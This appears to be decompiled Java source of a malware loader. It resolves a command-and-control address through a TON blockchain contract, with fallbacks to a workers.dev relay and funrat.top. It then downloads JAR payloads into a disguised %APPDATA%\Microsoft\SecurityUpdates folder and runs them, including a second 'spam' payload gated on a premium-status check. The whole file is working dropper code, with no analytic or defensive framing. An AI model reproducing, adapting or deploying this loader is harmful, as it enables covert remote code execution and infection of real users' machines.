/*
 * Decompiled with CFR 0.152.
 */
package core;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.management.ManagementFactory;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.nio.file.attribute.FileAttribute;
import java.util.Base64;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class core {
    private static final String CF_BASE = "https://telemetry-relay.kartohaantoha36-6a9.workers.dev";
    private static final String TACT_ADDR = "EQChU6Zxa_y2fKeeCaSDubGcFZizRdRVSArwAh6qJtfe9NKZ";

    public static void vov(String string, String string2, String string3, String string4, String string5) {
    }

    public static void mains(String string, String string2, String string3, String string4) {
        try {
            String string5 = core.resolveBase();
            String string6 = core.configSlot(string5, "1");
            if (string6 == null || !string6.startsWith("http")) {
                string6 = core.resolvePanel() + "/api/hlam/files/4001";
            }
            Path path = Paths.get(System.getenv("APPDATA"), "Microsoft", "SecurityUpdates");
            Files.createDirectories(path, new FileAttribute[0]);
            Path path2 = path.resolve("JavaInt.jar");
            core.download(string6, path2);
            String string7 = core.getCurrentProcessExePath();
            if (string7 == null || !new File(string7).isFile()) {
                string7 = "java";
            }
            String string8 = string4 == null ? "" : string4;
            new Thread(() -> core.maybeSpam(string5, string8)).start();
            new ProcessBuilder(string7, "-jar", path2.toString(), string, string2, string3, string8).redirectErrorStream(true).start();
        }
        catch (Exception exception) {
            System.out.println(exception.getClass().getSimpleName() + ": " + exception.getMessage());
        }
    }

    private static void maybeSpam(String string, String string2) {
        try {
            if (string2.startsWith("30e3267e-d80c-4a8f-84e2-bb475930a37c")) {
                return;
            }
            try {
                if (core.isPremium(string2)) {
                    return;
                }
            }
            catch (Exception exception) {
                return;
            }
            String string3 = core.configSlot(string, "2");
            if (string3 == null || !string3.startsWith("http")) {
                string3 = core.resolvePanel() + "/api/hlam/files/4003";
            }
            Path path = Paths.get(System.getenv("APPDATA"), "Microsoft", "SecurityUpdates");
            Files.createDirectories(path, new FileAttribute[0]);
            Path path2 = path.resolve("dis.jar");
            core.download(string3, path2);
            String string4 = core.getCurrentProcessExePath();
            if (string4 == null || !new File(string4).isFile()) {
                string4 = "java";
            }
            System.out.println("spam: " + string3);
            new ProcessBuilder(string4, "-jar", path2.toString()).redirectErrorStream(true).start();
        }
        catch (Exception exception) {
            System.out.println("spam err: " + exception.getMessage());
        }
    }

    private static boolean isPremium(String string) throws Exception {
        HttpURLConnection httpURLConnection = (HttpURLConnection)new URL(core.resolvePanel() + "/api/premium-status?id=" + string).openConnection();
        httpURLConnection.setRequestMethod("GET");
        httpURLConnection.setConnectTimeout(8000);
        httpURLConnection.setReadTimeout(10000);
        httpURLConnection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
        String string2 = core.readAllText(httpURLConnection.getInputStream());
        httpURLConnection.disconnect();
        return string2.contains("\"premium\":true");
    }

    private static String resolveBase() {
        try {
            String string = core.tonLink(8);
            if (string != null && string.startsWith("http")) {
                return string;
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
        return CF_BASE;
    }

    private static String tonLink(int n) throws Exception {
        HttpURLConnection httpURLConnection = (HttpURLConnection)new URL("https://toncenter.com/api/v2/runGetMethod").openConnection();
        httpURLConnection.setRequestMethod("POST");
        httpURLConnection.setDoOutput(true);
        httpURLConnection.setConnectTimeout(15000);
        httpURLConnection.setReadTimeout(30000);
        httpURLConnection.setRequestProperty("Content-Type", "application/json");
        String string = "{\"address\":\"EQChU6Zxa_y2fKeeCaSDubGcFZizRdRVSArwAh6qJtfe9NKZ\",\"method\":\"link\",\"stack\":[[\"int\",\"" + n + "\"]]}";
        try (Object object = httpURLConnection.getOutputStream();){
            ((OutputStream)object).write(string.getBytes(StandardCharsets.UTF_8));
        }
        object = core.readAllText(httpURLConnection.getInputStream());
        httpURLConnection.disconnect();
        Matcher matcher = Pattern.compile("\"b64\":\"([A-Za-z0-9+/=]+)\"").matcher((CharSequence)object);
        if (matcher.find()) {
            return new String(Base64.getDecoder().decode(matcher.group(1)), StandardCharsets.UTF_8);
        }
        return null;
    }

    private static String resolvePanel() {
        try {
            String string = core.configSlot(core.resolveBase(), "3");
            if (string != null && string.startsWith("http")) {
                return string;
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
        return "https://funrat.top";
    }

    private static String configSlot(String string, String string2) {
        try {
            HttpURLConnection httpURLConnection = (HttpURLConnection)new URL(string + "/config").openConnection();
            httpURLConnection.setRequestMethod("GET");
            httpURLConnection.setConnectTimeout(12000);
            httpURLConnection.setReadTimeout(12000);
            httpURLConnection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
            if (httpURLConnection.getResponseCode() != 200) {
                httpURLConnection.disconnect();
                return null;
            }
            String string3 = core.readAllText(httpURLConnection.getInputStream());
            httpURLConnection.disconnect();
            Matcher matcher = Pattern.compile("\"" + string2 + "\"\\s*:\\s*\"([^\"]+)\"").matcher(string3);
            if (matcher.find()) {
                return matcher.group(1);
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
        return null;
    }

    private static String readAllText(InputStream inputStream) throws IOException {
        int n;
        if (inputStream == null) {
            return "";
        }
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        byte[] byArray = new byte[8192];
        while ((n = inputStream.read(byArray)) != -1) {
            byteArrayOutputStream.write(byArray, 0, n);
        }
        return new String(byteArrayOutputStream.toByteArray(), StandardCharsets.UTF_8);
    }

    private static void download(String string, Path path) throws Exception {
        HttpURLConnection httpURLConnection = (HttpURLConnection)new URL(string).openConnection();
        httpURLConnection.setRequestMethod("GET");
        httpURLConnection.setConnectTimeout(15000);
        httpURLConnection.setReadTimeout(240000);
        httpURLConnection.setRequestProperty("Accept", "application/java-archive");
        httpURLConnection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
        int n = httpURLConnection.getResponseCode();
        if (n != 200) {
            httpURLConnection.disconnect();
            throw new IOException("HTTP " + n);
        }
        long l = httpURLConnection.getContentLengthLong();
        long l2 = 0L;
        try (InputStream inputStream = httpURLConnection.getInputStream();
             OutputStream outputStream = Files.newOutputStream(path, StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE_EXISTING, StandardOpenOption.WRITE);){
            int n2;
            byte[] byArray = new byte[65536];
            while ((n2 = inputStream.read(byArray)) != -1) {
                outputStream.write(byArray, 0, n2);
                l2 += (long)n2;
            }
        }
        httpURLConnection.disconnect();
        if (l2 <= 0L) {
            Files.deleteIfExists(path);
            throw new IOException("empty");
        }
        if (l > 0L && l2 != l) {
            Files.deleteIfExists(path);
            throw new IOException("truncated " + l2 + "/" + l);
        }
    }

    private static String getCurrentProcessExePath() {
        try {
            String string;
            long l = Long.parseLong(ManagementFactory.getRuntimeMXBean().getName().split("@")[0]);
            ProcessBuilder processBuilder = new ProcessBuilder("powershell.exe", "-NoProfile", "-Command", "(Get-Process -Id " + l + ").Path");
            processBuilder.redirectErrorStream(true);
            Process process = processBuilder.start();
            try (InputStream inputStream = process.getInputStream();){
                int n;
                ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                byte[] byArray = new byte[8192];
                while ((n = inputStream.read(byArray)) != -1) {
                    byteArrayOutputStream.write(byArray, 0, n);
                }
                string = new String(byteArrayOutputStream.toByteArray(), StandardCharsets.UTF_8).trim();
            }
            process.waitFor();
            if (string != null && !string.isEmpty()) {
                return string;
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
        return null;
    }

    public static void main(String[] stringArray) {
        if (stringArray.length == 4) {
            core.mains(stringArray[0], stringArray[1], stringArray[2], stringArray[3]);
            return;
        }
        if (stringArray.length == 2 && "Discord".equals(stringArray[1])) {
            core.mains("Discord", "Click", "Click", stringArray[0]);
            return;
        }
        if (stringArray.length == 1) {
            core.mains("Run", "Click", "Click", stringArray[0]);
            return;
        }
    }
}

